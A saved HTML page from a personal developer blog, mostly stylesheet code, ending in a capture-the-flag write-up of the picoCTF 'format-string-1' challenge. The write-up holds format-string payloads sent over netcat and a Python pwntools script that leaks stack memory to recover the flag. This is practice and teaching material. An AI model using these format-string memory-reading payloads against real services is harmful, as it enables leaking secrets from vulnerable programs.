@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <script type="module">import { injectIntoGlobalHook } from "/blog/@react-refresh";
+injectIntoGlobalHook(window);
+window.$RefreshReg$ = () => {};
+window.$RefreshSig$ = () => (type) => type;</script>
+
+    <script type="module" src="a_files/client.js"></script>
+
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="http://localhost:5173/blog/dev.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>&lt;ElMalditoBlog/&gt;</title>
+  <style type="text/css" data-vite-dev-id="/home/emiemiemi/docs/pjs/react_blog/elmalditoblog/src/index.css">:root { 
+  /* Catpuccin mocha*/
+  --mocha-rosewater: #f5e0dc;
+  --mocha-flamingo: #f2cdcd;
+  --mocha-pink: #f5c2e7;
+  --mocha-mauve: #cba6f7;
+  --mocha-red: #f38ba8;
+  --mocha-maroon: #eba0ac;
+  --mocha-peach: #fab387;
+  --mocha-yellow: #f9e2af;
+  --mocha-green: #a6e3a1;
+  --mocha-teal: #94e2d5;
+  --mocha-sky: #89dceb;
+  --mocha-sapphire: #74c7ec;
+  --mocha-blue: #89b4fa;
+  --mocha-lavender: #b4befe;
+  --mocha-text: #cdd6f4;
+  --mocha-subtext1: #bac2de;
+  --mocha-subtext0: #a6adc8;
+  --mocha-overlay2: #9399b2;
+  --mocha-overlay1: #7f849c;
+  --mocha-overlay0: #6c7086;
+  --mocha-surface2: #585b70;
+  --mocha-surface1: #45475a;
+  --mocha-surface0: #313244;
+  --mocha-base: #1e1e2e;
+  --mocha-mantle: #181825;
+  --mocha-crust: #11111b;
+  /* Catpuccin latte*/
+  --latte-rosewater: #dc8a78;
+  --latte-flamingo: #dd7878;
+  --latte-pink: #ea76cb;
+  --latte-mauve: #8839ef;
+  --latte-red: #d20f39;
+  --latte-maroon: #e64553;
+  --latte-peach: #fe640b;
+  --latte-yellow: #df8e1d;
+  --latte-green: #40a02b;
+  --latte-teal: #179299;
+  --latte-sky: #04a5e5;
+  --latte-sapphire: #209fb5;
+  --latte-blue: #1e66f5;
+  --latte-lavender: #7287fd;
+  --latte-text: #4c4f69;
+  --latte-subtext1: #5c5f77;
+  --latte-subtext0: #6c6f85;
+  --latte-overlay2: #7c7f93;
+  --latte-overlay1: #8c8fa1;
+  --latte-overlay0: #9ca0b0;
+  --latte-surface2: #acb0be;
+  --latte-surface1: #bcc0cc;
+  --latte-surface0: #ccd0da;
+  --latte-base: #eff1f5;
+  --latte-mantle: #e6e9ef;
+  --latte-crust: #dce0e8;
+}
+
+</style><style type="text/css" data-vite-dev-id="/home/emiemiemi/docs/pjs/react_blog/elmalditoblog/src/App.css">*, ::before, ::after {
+  --tw-border-spacing-x: 0;
+  --tw-border-spacing-y: 0;
+  --tw-translate-x: 0;
+  --tw-translate-y: 0;
+  --tw-rotate: 0;
+  --tw-skew-x: 0;
+  --tw-skew-y: 0;
+  --tw-scale-x: 1;
+  --tw-scale-y: 1;
+  --tw-pan-x:  ;
+  --tw-pan-y:  ;
+  --tw-pinch-zoom:  ;
+  --tw-scroll-snap-strictness: proximity;
+  --tw-gradient-from-position:  ;
+  --tw-gradient-via-position:  ;
+  --tw-gradient-to-position:  ;
+  --tw-ordinal:  ;
+  --tw-slashed-zero:  ;
+  --tw-numeric-figure:  ;
+  --tw-numeric-spacing:  ;
+  --tw-numeric-fraction:  ;
+  --tw-ring-inset:  ;
+  --tw-ring-offset-width: 0px;
+  --tw-ring-offset-color: #fff;
+  --tw-ring-color: rgb(59 130 246 / 0.5);
+  --tw-ring-offset-shadow: 0 0 #0000;
+  --tw-ring-shadow: 0 0 #0000;
+  --tw-shadow: 0 0 #0000;
+  --tw-shadow-colored: 0 0 #0000;
+  --tw-blur:  ;
+  --tw-brightness:  ;
+  --tw-contrast:  ;
+  --tw-grayscale:  ;
+  --tw-hue-rotate:  ;
+  --tw-invert:  ;
+  --tw-saturate:  ;
+  --tw-sepia:  ;
+  --tw-drop-shadow:  ;
+  --tw-backdrop-blur:  ;
+  --tw-backdrop-brightness:  ;
+  --tw-backdrop-contrast:  ;
+  --tw-backdrop-grayscale:  ;
+  --tw-backdrop-hue-rotate:  ;
+  --tw-backdrop-invert:  ;
+  --tw-backdrop-opacity:  ;
+  --tw-backdrop-saturate:  ;
+  --tw-backdrop-sepia:  ;
+  --tw-contain-size:  ;
+  --tw-contain-layout:  ;
+  --tw-contain-paint:  ;
+  --tw-contain-style:  ;
+}
+
+::backdrop {
+  --tw-border-spacing-x: 0;
+  --tw-border-spacing-y: 0;
+  --tw-translate-x: 0;
+  --tw-translate-y: 0;
+  --tw-rotate: 0;
+  --tw-skew-x: 0;
+  --tw-skew-y: 0;
+  --tw-scale-x: 1;
+  --tw-scale-y: 1;
+  --tw-pan-x:  ;
+  --tw-pan-y:  ;
+  --tw-pinch-zoom:  ;
+  --tw-scroll-snap-strictness: proximity;
+  --tw-gradient-from-position:  ;
+  --tw-gradient-via-position:  ;
+  --tw-gradient-to-position:  ;
+  --tw-ordinal:  ;
+  --tw-slashed-zero:  ;
+  --tw-numeric-figure:  ;
+  --tw-numeric-spacing:  ;
+  --tw-numeric-fraction:  ;
+  --tw-ring-inset:  ;
+  --tw-ring-offset-width: 0px;
+  --tw-ring-offset-color: #fff;
+  --tw-ring-color: rgb(59 130 246 / 0.5);
+  --tw-ring-offset-shadow: 0 0 #0000;
+  --tw-ring-shadow: 0 0 #0000;
+  --tw-shadow: 0 0 #0000;
+  --tw-shadow-colored: 0 0 #0000;
+  --tw-blur:  ;
+  --tw-brightness:  ;
+  --tw-contrast:  ;
+  --tw-grayscale:  ;
+  --tw-hue-rotate:  ;
+  --tw-invert:  ;
+  --tw-saturate:  ;
+  --tw-sepia:  ;
+  --tw-drop-shadow:  ;
+  --tw-backdrop-blur:  ;
+  --tw-backdrop-brightness:  ;
+  --tw-backdrop-contrast:  ;
+  --tw-backdrop-grayscale:  ;
+  --tw-backdrop-hue-rotate:  ;
+  --tw-backdrop-invert:  ;
+  --tw-backdrop-opacity:  ;
+  --tw-backdrop-saturate:  ;
+  --tw-backdrop-sepia:  ;
+  --tw-contain-size:  ;
+  --tw-contain-layout:  ;
+  --tw-contain-paint:  ;
+  --tw-contain-style:  ;
+}/*
+! tailwindcss v3.4.15 | MIT License | https://tailwindcss.com
+*//*
+1. Prevent padding and border from affecting element width. (https://github.com/mozdevs/cssremedy/issues/4)
+2. Allow adding a border to an element by just adding a border-width. (https://github.com/tailwindcss/tailwindcss/pull/116)
+*/
+
+*,
+::before,
+::after {
+  box-sizing: border-box; /* 1 */
+  border-width: 0; /* 2 */
+  border-style: solid; /* 2 */
+  border-color: #e5e7eb; /* 2 */
+}
+
+::before,
+::after {
+  --tw-content: '';
+}
+
+/*
+1. Use a consistent sensible line-height in all browsers.
+2. Prevent adjustments of font size after orientation changes in iOS.
+3. Use a more readable tab size.
+4. Use the user's configured `sans` font-family by default.
+5. Use the user's configured `sans` font-feature-settings by default.
+6. Use the user's configured `sans` font-variation-settings by default.
+7. Disable tap highlights on iOS
+*/
+
+html,
+:host {
+  line-height: 1.5; /* 1 */
+  -webkit-text-size-adjust: 100%; /* 2 */
+  -moz-tab-size: 4; /* 3 */
+  -o-tab-size: 4;
+     tab-size: 4; /* 3 */
+  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"; /* 4 */
+  font-feature-settings: normal; /* 5 */
+  font-variation-settings: normal; /* 6 */
+  -webkit-tap-highlight-color: transparent; /* 7 */
+}
+
+/*
+1. Remove the margin in all browsers.
+2. Inherit line-height from `html` so users can set them as a class directly on the `html` element.
+*/
+
+body {
+  margin: 0; /* 1 */
+  line-height: inherit; /* 2 */
+}
+
+/*
+1. Add the correct height in Firefox.
+2. Correct the inheritance of border color in Firefox. (https://bugzilla.mozilla.org/show_bug.cgi?id=190655)
+3. Ensure horizontal rules are visible by default.
+*/
+
+hr {
+  height: 0; /* 1 */
+  color: inherit; /* 2 */
+  border-top-width: 1px; /* 3 */
+}
+
+/*
+Add the correct text decoration in Chrome, Edge, and Safari.
+*/
+
+abbr:where([title]) {
+  -webkit-text-decoration: underline dotted;
+          text-decoration: underline dotted;
+}
+
+/*
+Remove the default font size and weight for headings.
+*/
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+  font-size: inherit;
+  font-weight: inherit;
+}
+
+/*
+Reset links to optimize for opt-in styling instead of opt-out.
+*/
+
+a {
+  color: inherit;
+  text-decoration: inherit;
+}
+
+/*
+Add the correct font weight in Edge and Safari.
+*/
+
+b,
+strong {
+  font-weight: bolder;
+}
+
+/*
+1. Use the user's configured `mono` font-family by default.
+2. Use the user's configured `mono` font-feature-settings by default.
+3. Use the user's configured `mono` font-variation-settings by default.
+4. Correct the odd `em` font sizing in all browsers.
+*/
+
+code,
+kbd,
+samp,
+pre {
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; /* 1 */
+  font-feature-settings: normal; /* 2 */
+  font-variation-settings: normal; /* 3 */
+  font-size: 1em; /* 4 */
+}
+
+/*
+Add the correct font size in all browsers.
+*/
+
+small {
+  font-size: 80%;
+}
+
+/*
+Prevent `sub` and `sup` elements from affecting the line height in all browsers.
+*/
+
+sub,
+sup {
+  font-size: 75%;
+  line-height: 0;
+  position: relative;
+  vertical-align: baseline;
+}
+
+sub {
+  bottom: -0.25em;
+}
+
+sup {
+  top: -0.5em;
+}
+
+/*
+1. Remove text indentation from table contents in Chrome and Safari. (https://bugs.chromium.org/p/chromium/issues/detail?id=999088, https://bugs.webkit.org/show_bug.cgi?id=201297)
+2. Correct table border color inheritance in all Chrome and Safari. (https://bugs.chromium.org/p/chromium/issues/detail?id=935729, https://bugs.webkit.org/show_bug.cgi?id=195016)
+3. Remove gaps between table borders by default.
+*/
+
+table {
+  text-indent: 0; /* 1 */
+  border-color: inherit; /* 2 */
+  border-collapse: collapse; /* 3 */
+}
+
+/*
+1. Change the font styles in all browsers.
+2. Remove the margin in Firefox and Safari.
+3. Remove default padding in all browsers.
+*/
+
+button,
+input,
+optgroup,
+select,
+textarea {
+  font-family: inherit; /* 1 */
+  font-feature-settings: inherit; /* 1 */
+  font-variation-settings: inherit; /* 1 */
+  font-size: 100%; /* 1 */
+  font-weight: inherit; /* 1 */
+  line-height: inherit; /* 1 */
+  letter-spacing: inherit; /* 1 */
+  color: inherit; /* 1 */
+  margin: 0; /* 2 */
+  padding: 0; /* 3 */
+}
+
+/*
+Remove the inheritance of text transform in Edge and Firefox.
+*/
+
+button,
+select {
+  text-transform: none;
+}
+
+/*
+1. Correct the inability to style clickable types in iOS and Safari.
+2. Remove default button styles.
+*/
+
+button,
+input:where([type='button']),
+input:where([type='reset']),
+input:where([type='submit']) {
+  -webkit-appearance: button; /* 1 */
+  background-color: transparent; /* 2 */
+  background-image: none; /* 2 */
+}
+
+/*
+Use the modern Firefox focus style for all focusable elements.
+*/
+
+:-moz-focusring {
+  outline: auto;
+}
+
+/*
+Remove the additional `:invalid` styles in Firefox. (https://github.com/mozilla/gecko-dev/blob/2f9eacd9d3d995c937b4251a5557d95d494c9be1/layout/style/res/forms.css#L728-L737)
+*/
+
+:-moz-ui-invalid {
+  box-shadow: none;
+}
+
+/*
+Add the correct vertical alignment in Chrome and Firefox.
+*/
+
+progress {
+  vertical-align: baseline;
+}
+
+/*
+Correct the cursor style of increment and decrement buttons in Safari.
+*/
+
+::-webkit-inner-spin-button,
+::-webkit-outer-spin-button {
+  height: auto;
+}
+
+/*
+1. Correct the odd appearance in Chrome and Safari.
+2. Correct the outline style in Safari.
+*/
+
+[type='search'] {
+  -webkit-appearance: textfield; /* 1 */
+  outline-offset: -2px; /* 2 */
+}
+
+/*
+Remove the inner padding in Chrome and Safari on macOS.
+*/
+
+::-webkit-search-decoration {
+  -webkit-appearance: none;
+}
+
+/*
+1. Correct the inability to style clickable types in iOS and Safari.
+2. Change font properties to `inherit` in Safari.
+*/
+
+::-webkit-file-upload-button {
+  -webkit-appearance: button; /* 1 */
+  font: inherit; /* 2 */
+}
+
+/*
+Add the correct display in Chrome and Safari.
+*/
+
+summary {
+  display: list-item;
+}
+
+/*
+Removes the default spacing and border for appropriate elements.
+*/
+
+blockquote,
+dl,
+dd,
+h1,
+h2,
+h3,
+h4,
+h5,
+h6,
+hr,
+figure,
+p,
+pre {
+  margin: 0;
+}
+
+fieldset {
+  margin: 0;
+  padding: 0;
+}
+
+legend {
+  padding: 0;
+}
+
+ol,
+ul,
+menu {
+  list-style: none;
+  margin: 0;
+  padding: 0;
+}
+
+/*
+Reset default styling for dialogs.
+*/
+dialog {
+  padding: 0;
+}
+
+/*
+Prevent resizing textareas horizontally by default.
+*/
+
+textarea {
+  resize: vertical;
+}
+
+/*
+1. Reset the default placeholder opacity in Firefox. (https://github.com/tailwindlabs/tailwindcss/issues/3300)
+2. Set the default placeholder color to the user's configured gray 400 color.
+*/
+
+input::-moz-placeholder, textarea::-moz-placeholder {
+  opacity: 1; /* 1 */
+  color: #9ca3af; /* 2 */
+}
+
+input::placeholder,
+textarea::placeholder {
+  opacity: 1; /* 1 */
+  color: #9ca3af; /* 2 */
+}
+
+/*
+Set the default cursor for buttons.
+*/
+
+button,
+[role="button"] {
+  cursor: pointer;
+}
+
+/*
+Make sure disabled buttons don't get the pointer cursor.
+*/
+:disabled {
+  cursor: default;
+}
+
+/*
+1. Make replaced elements `display: block` by default. (https://github.com/mozdevs/cssremedy/issues/14)
+2. Add `vertical-align: middle` to align replaced elements more sensibly by default. (https://github.com/jensimmons/cssremedy/issues/14#issuecomment-634934210)
+   This can trigger a poorly considered lint error in some tools but is included by design.
+*/
+
+img,
+svg,
+video,
+canvas,
+audio,
+iframe,
+embed,
+object {
+  display: block; /* 1 */
+  vertical-align: middle; /* 2 */
+}
+
+/*
+Constrain images and videos to the parent width and preserve their intrinsic aspect ratio. (https://github.com/mozdevs/cssremedy/issues/14)
+*/
+
+img,
+video {
+  max-width: 100%;
+  height: auto;
+}
+
+/* Make elements with the HTML hidden attribute stay hidden by default */
+[hidden]:where(:not([hidden="until-found"])) {
+  display: none;
+}
+.absolute {
+  position: absolute;
+}
+.relative {
+  position: relative;
+}
+.right-0 {
+  right: 0px;
+}
+.top-0 {
+  top: 0px;
+}
+.top-\[4rem\] {
+  top: 4rem;
+}
+.z-50 {
+  z-index: 50;
+}
+.m-2 {
+  margin: 0.5rem;
+}
+.m-4 {
+  margin: 1rem;
+}
+.mb-0 {
+  margin-bottom: 0px;
+}
+.mb-4 {
+  margin-bottom: 1rem;
+}
+.mb-5 {
+  margin-bottom: 1.25rem;
+}
+.ml-5 {
+  margin-left: 1.25rem;
+}
+.ml-6 {
+  margin-left: 1.5rem;
+}
+.mr-2 {
+  margin-right: 0.5rem;
+}
+.mr-6 {
+  margin-right: 1.5rem;
+}
+.mt-14 {
+  margin-top: 3.5rem;
+}
+.mt-4 {
+  margin-top: 1rem;
+}
+.inline-block {
+  display: inline-block;
+}
+.flex {
+  display: flex;
+}
+.grid {
+  display: grid;
+}
+.hidden {
+  display: none;
+}
+.h-6 {
+  height: 1.5rem;
+}
+.h-screen {
+  height: 100vh;
+}
+.max-h-24 {
+  max-height: 6rem;
+}
+.min-h-\[fit-content\] {
+  min-height: -moz-fit-content;
+  min-height: fit-content;
+}
+.w-7 {
+  width: 1.75rem;
+}
+.w-9\/12 {
+  width: 75%;
+}
+.w-\[70\%\] {
+  width: 70%;
+}
+.w-full {
+  width: 100%;
+}
+.max-w-screen-lg {
+  max-width: 1024px;
+}
+.resize {
+  resize: both;
+}
+.grid-cols-1 {
+  grid-template-columns: repeat(1, minmax(0, 1fr));
+}
+.flex-col {
+  flex-direction: column;
+}
+.place-content-center {
+  place-content: center;
+}
+.items-center {
+  align-items: center;
+}
+.justify-center {
+  justify-content: center;
+}
+.justify-between {
+  justify-content: space-between;
+}
+.gap-6 {
+  gap: 1.5rem;
+}
+.space-x-3 > :not([hidden]) ~ :not([hidden]) {
+  --tw-space-x-reverse: 0;
+  margin-right: calc(0.75rem * var(--tw-space-x-reverse));
+  margin-left: calc(0.75rem * calc(1 - var(--tw-space-x-reverse)));
+}
+.self-center {
+  align-self: center;
+}
+.rounded-lg {
+  border-radius: 0.5rem;
+}
+.border-t-2 {
+  border-top-width: 2px;
+}
+.bg-background {
+  background-color: var(--background);
+}
+.p-3 {
+  padding: 0.75rem;
+}
+.p-4 {
+  padding: 1rem;
+}
+.p-6 {
+  padding: 1.5rem;
+}
+.pb-1 {
+  padding-bottom: 0.25rem;
+}
+.pb-3 {
+  padding-bottom: 0.75rem;
+}
+.pl-6 {
+  padding-left: 1.5rem;
+}
+.pr-6 {
+  padding-right: 1.5rem;
+}
+.pt-1 {
+  padding-top: 0.25rem;
+}
+.pt-2 {
+  padding-top: 0.5rem;
+}
+.pt-3 {
+  padding-top: 0.75rem;
+}
+.pt-5 {
+  padding-top: 1.25rem;
+}
+.text-center {
+  text-align: center;
+}
+.align-middle {
+  vertical-align: middle;
+}
+.text-2xl {
+  font-size: 1.5rem;
+  line-height: 2rem;
+}
+.text-4xl {
+  font-size: 2.25rem;
+  line-height: 2.5rem;
+}
+.text-lg {
+  font-size: 1.125rem;
+  line-height: 1.75rem;
+}
+.text-sm {
+  font-size: 0.875rem;
+  line-height: 1.25rem;
+}
+.font-bold {
+  font-weight: 700;
+}
+.text-foreground {
+  color: var(--foreground);
+}
+.shadow-lg {
+  --tw-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
+  --tw-shadow-colored: 0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);
+  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
+}
+.transition {
+  transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, -webkit-backdrop-filter;
+  transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;
+  transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter, -webkit-backdrop-filter;
+  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+  transition-duration: 150ms;
+}
+
+:root { 
+  /* Catpuccin mocha*/
+  --mocha-rosewater: #f5e0dc;
+  --mocha-flamingo: #f2cdcd;
+  --mocha-pink: #f5c2e7;
+  --mocha-mauve: #cba6f7;
+  --mocha-red: #f38ba8;
+  --mocha-maroon: #eba0ac;
+  --mocha-peach: #fab387;
+  --mocha-yellow: #f9e2af;
+  --mocha-green: #a6e3a1;
+  --mocha-teal: #94e2d5;
+  --mocha-sky: #89dceb;
+  --mocha-sapphire: #74c7ec;
+  --mocha-blue: #89b4fa;
+  --mocha-lavender: #b4befe;
+  --mocha-text: #cdd6f4;
+  --mocha-subtext1: #bac2de;
+  --mocha-subtext0: #a6adc8;
+  --mocha-overlay2: #9399b2;
+  --mocha-overlay1: #7f849c;
+  --mocha-overlay0: #6c7086;
+  --mocha-surface2: #585b70;
+  --mocha-surface1: #45475a;
+  --mocha-surface0: #313244;
+  --mocha-base: #1e1e2e;
+  --mocha-mantle: #181825;
+  --mocha-crust: #11111b;
+  /* Catpuccin latte*/
+  --latte-rosewater: #dc8a78;
+  --latte-flamingo: #dd7878;
+  --latte-pink: #ea76cb;
+  --latte-mauve: #8839ef;
+  --latte-red: #d20f39;
+  --latte-maroon: #e64553;
+  --latte-peach: #fe640b;
+  --latte-yellow: #df8e1d;
+  --latte-green: #40a02b;
+  --latte-teal: #179299;
+  --latte-sky: #04a5e5;
+  --latte-sapphire: #209fb5;
+  --latte-blue: #1e66f5;
+  --latte-lavender: #7287fd;
+  --latte-text: #4c4f69;
+  --latte-subtext1: #5c5f77;
+  --latte-subtext0: #6c6f85;
+  --latte-overlay2: #7c7f93;
+  --latte-overlay1: #8c8fa1;
+  --latte-overlay0: #9ca0b0;
+  --latte-surface2: #acb0be;
+  --latte-surface1: #bcc0cc;
+  --latte-surface0: #ccd0da;
+  --latte-base: #eff1f5;
+  --latte-mantle: #e6e9ef;
+  --latte-crust: #dce0e8;
+  --background: var(--mocha-base);
+  --foreground: var(--mocha-mauve);
+}
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --background: var(--mocha-base);
+    --foreground: var(--mocha-mauve);
+    --accent-1: var(--mocha-mauve);
+  }
+}
+
+body {
+  color: var(--foreground);
+  background: var(--background);
+  font-family: 'DM Mono', monospace;
+  font-size: 1.125rem;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+.nav-bar {
+  background: var(--mocha-mauve);
+  color: var(--mocha-base);
+  display: flex;
+  padding: 10pt;
+}
+
+.footer {
+  color: var(--mocha-base);
+  background: var(--mocha-blue);
+  padding: 10pt;
+  font-size: 0.875rem;
+}
+
+.Emibox{
+  border: var(--mocha-mauve);
+  border-width: 1.5pt;
+  border-style: solid;
+  padding: 10pt;
+  border-radius: 8px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.Emibox .Emibox-title {
+  color: var(--mocha-peach);
+  font-weight: 600;
+  position: relative;
+  top: -24pt;
+  left: -7pt;
+  width: -moz-fit-content;
+  width: fit-content;
+  padding-left: 4pt;
+  padding-right: 4pt;
+  margin-bottom: -20pt;
+  background-color: var(--mocha-base);
+  display: block;
+  white-space: nowrap;
+}
+
+.Emibox .seeAll {
+  color: var(--mocha-peach);
+  background-color: var(--mocha-surface0);
+  border: 5pt solid var(--mocha-base);
+  padding: 10pt;
+  font-weight: 1000;
+  width: -moz-fit-content;
+  width: fit-content;
+  border-radius: 15px;
+  position: relative;
+  bottom: -42pt;
+  justify-self: center;
+  margin: 0;
+  margin-top: -40pt ;
+  max-width: 200pt;
+  white-space: nowrap;
+
+}
+
+.NavBarBase {
+  color: var(--mocha-mauve);
+  background-color: var(--mocha-mantle);
+  border: var(--mocha-mauve);
+  border: 1.3pt solid;
+}
+
+.NavBarBase .NavBarDropDown {
+  color: var(--mocha-mauve);
+  background-color: var(--mocha-mantle);
+  border: 1.3pt solid;
+}
+
+.accent-1 {
+  border-color: var(--border-accent-1);
+}
+
+.backhomebutton {
+  color: var(--mocha-peach);
+  background-color: var(--mocha-surface0);
+  border: none;
+  border-radius: 8px;
+  padding: 10pt;
+  margin-top: 10pt;
+  margin-bottom: 10pt;
+  font-size: 1.125rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
+
+.backhomebutton:hover {
+  background-color: var(--mocha-yellow);
+}
+
+.first\:mt-2:first-child {
+  margin-top: 0.5rem;
+}
+
+.first\:pt-2:first-child {
+  padding-top: 0.5rem;
+}
+
+.last\:mb-1:last-child {
+  margin-bottom: 0.25rem;
+}
+
+.last\:mb-2:last-child {
+  margin-bottom: 0.5rem;
+}
+
+.last\:pb-2:last-child {
+  padding-bottom: 0.5rem;
+}
+
+@media (min-width: 768px) {
+
+  .md\:mb-8 {
+    margin-bottom: 2rem;
+  }
+
+  .md\:ml-48 {
+    margin-left: 12rem;
+  }
+
+  .md\:mr-48 {
+    margin-right: 12rem;
+  }
+
+  .md\:w-6\/12 {
+    width: 50%;
+  }
+
+  .md\:grid-cols-1 {
+    grid-template-columns: repeat(1, minmax(0, 1fr));
+  }
+
+  .md\:p-12 {
+    padding: 3rem;
+  }
+
+  .md\:pt-10 {
+    padding-top: 2.5rem;
+  }
+
+  .md\:text-2xl {
+    font-size: 1.5rem;
+    line-height: 2rem;
+  }
+
+  .md\:text-7xl {
+    font-size: 4.5rem;
+    line-height: 1;
+  }
+
+  .md\:text-base {
+    font-size: 1rem;
+    line-height: 1.5rem;
+  }
+}
+
+@media (min-width: 1024px) {
+
+  .lg\:mx-auto {
+    margin-left: auto;
+    margin-right: auto;
+  }
+
+  .lg\:mb-8 {
+    margin-bottom: 2rem;
+  }
+
+  .lg\:ml-96 {
+    margin-left: 24rem;
+  }
+
+  .lg\:mr-96 {
+    margin-right: 24rem;
+  }
+
+  .lg\:hidden {
+    display: none;
+  }
+
+  .lg\:w-6\/12 {
+    width: 50%;
+  }
+}
+</style></head>
+  <body>
+    <div id="root"><div class="blog-page"><h1>Blog ananan</h1><div class="blog-post"><h1>Description</h1>
+<p>Patrick and Sponge Bob were really happy with those orders you made 
+for them, but now they're curious about the secret menu. Find it, and 
+along the way, maybe you'll find something else of interest!</p>
+<h1>Context</h1>
+<p>On connecting via netcat:</p>
+<pre><code>❯ nc mimas.picoctf.net 62487
+Give me your order and I'll read it back to you:
+1
+Here's your order: 1
+Bye!
+</code></pre>
+<p>We can also know that the binary is 64-bit:</p>
+<pre><code>❯ objdump -a format-string-1
+
+format-string-1:     file format elf64-x86-64
+format-string-1
+
+</code></pre>
+<h1>Solving</h1>
+<h2>Trying some weird inputs</h2>
+<p>Since the name of the challenge is "format-string-1", lets try using some format char inputs.</p>
+<h3>Reading some unset bytes from <code>buf</code></h3>
+<pre><code>❯ nc mimas.picoctf.net 62487
+Give me your order and I'll read it back to you:
+%x%x%x%x%x
+Here's your order: 40211804076a00021d7880
+Bye!
+</code></pre>
+<h3>Reading the arg <code>buf</code> using <code>buf</code>?</h3>
+<p>Since this is a 64-bit program, the argument for the <code>printf</code> function
+can be accessed using the <code>%5$s</code> format string. The syntax is <code>%&lt;arg number&gt;$&lt;format&gt;</code> for 32-bit programs, and <code>%&lt;arg_number+5&gt;$&lt;format&gt;</code> for 64-bit.</p>
+<pre><code>❯ nc mimas.picoctf.net 62487
+Give me your order and I'll read it back to you:
+hello%5$s
+Here's your order: hellohello%5$s
+
+Bye!
+</code></pre>
+<h3>Exploring the stack</h3>
+<p>We saw that we can read the argument <code>buf</code> using <code>%5$s</code>, but we can go
+even further and explore the stack to find some interesting values.
+This is possible because in case the <code>printf</code> function needs more arguments
+those will be read from the stack. We can use the <code>%&lt;arg_number&gt;$lx</code> format with a higher number to read the stack.</p>
+<p>The following python code will help us explore the stack this way:</p>
+<p>It will connect to the server, send a payload, and return the 
+response cutting the added part of the response, in order to get only 
+the bytes read from memroy. The response will be decoded from hex to 
+utf-8 if it has 16 bytes (In other case it means we red something else, 
+mostly alignment padding).</p>
+<pre><code class="language-python">def connect_send(payload):
+    io = remote("mimas.picoctf.net", 61211)
+    print(str(io.recvline()))
+    io.sendline(payload)
+    recvd = io.recvall()
+    recvd = recvd.replace(b"Here's your order: ", b"")
+    recvd = recvd.replace(b"\nBye!\n", b"")
+    return try_string(recvd)
+
+def try_string(hex_string):
+    if len(hex_string)&gt;=16:
+        try:
+            decoded_string = codecs.decode(hex_string, "hex").decode("utf-8")
+            print("!!!!!!!!!!!!!!!! Decoded string: ", decoded_string)
+            return decoded_string
+        
+        except Exception as e:
+            print("Error decoding string: ", e)
+
+def explore_the_stack():
+    findings = []
+    for i in range(20):
+        pos_offseted = 5+i
+        finding = connect_send(b"%"+str(pos_offseted).encode()+b"$llx")
+        if(finding != None):
+            findings.append(finding)
+
+    print(findings)
+</code></pre>
+<p>The execution of the code will give us the following output:</p>
+<p>['{FTCocip', '5_14m1n4', '4x4_31y7', 'e5_g41f_', '}4bcb76', '#\x00\x00\x00\x07', ' ni3t0rP']</p>
+<p>Clearly some of the flag is revealed in the output, if we reverse the first element in the array.
+The flag would be the first five elements reversed. The output is reversed because the endianess of the memory
+but since each character is 1 byte, data doesn't break reading this way, just gets reversed.</p>
+<p>This leaves us with a single question:
+Is the last item in the array the secret ingredient?</p></div></div></div>
+    <script type="module" src="a_files/main.js"></script>
+  
+
+</body></html>
